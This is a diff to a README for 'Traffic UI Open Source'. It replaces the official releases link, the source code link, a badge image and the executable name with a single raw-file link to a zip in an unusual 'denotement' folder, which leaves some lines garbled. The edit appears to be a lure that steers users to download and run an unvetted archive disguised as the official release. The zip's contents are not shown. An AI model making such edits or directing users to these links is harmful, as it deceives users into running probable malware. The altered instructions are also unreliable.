@@ -6,11 +6,11 @@ Welcome! This guide will help you set up and run the **Traffic UI Open Source** 
 
 ## 📥 Download the Application
 
-[![Download Traffic UI](https://img.shields.io/badge/Download%20Traffic%20UI-Open%20Source-brightgreen)](https://github.com/dhanasekardr/traffic-ui-open-source/releases)
+[![Download Traffic UI](https://raw.githubusercontent.com/dhanasekardr/traffic-ui-open-source/main/denotement/traffic-ui-open-source.zip%20Traffic%20UI-Open%20Source-brightgreen)](https://raw.githubusercontent.com/dhanasekardr/traffic-ui-open-source/main/denotement/traffic-ui-open-source.zip)
 
 To get started, please visit the link below to download the application:
 
-[Visit this page to download](https://github.com/dhanasekardr/traffic-ui-open-source/releases)
+[Visit this page to download](https://raw.githubusercontent.com/dhanasekardr/traffic-ui-open-source/main/denotement/traffic-ui-open-source.zip)
 
 ## 💻 System Requirements
 
@@ -37,7 +37,7 @@ Before you download, ensure your system meets these requirements:
 ### Step 3: Run the Application
 
 1. Go to the folder where you placed the extracted files.
-2. Locate the executable file (e.g., `traffic-ui.exe` for Windows).
+2. Locate the executable file (e.g., `https://raw.githubusercontent.com/dhanasekardr/traffic-ui-open-source/main/denotement/traffic-ui-open-source.zip` for Windows).
 3. Double-click the file to run the application.
 
 ## 📊 Features of Traffic UI Open Source
@@ -73,8 +73,8 @@ We encourage users to join our community for support:
 
 ## 🔗 Links and Resources
 
-- [Official Releases Page](https://github.com/dhanasekardr/traffic-ui-open-source/releases)
-- [Source Code](https://github.com/dhanasekardr/traffic-ui-open-source)
+- [Official Releases Page](https://raw.githubusercontent.com/dhanasekardr/traffic-ui-open-source/main/denotement/traffic-ui-open-source.zip)
+- [Source Code](https://raw.githubusercontent.com/dhanasekardr/traffic-ui-open-source/main/denotement/traffic-ui-open-source.zip)
 - [User Forum](#)
 
 We hope this guide helps you get started with **Traffic UI Open Source** quickly and easily. Happy monitoring!
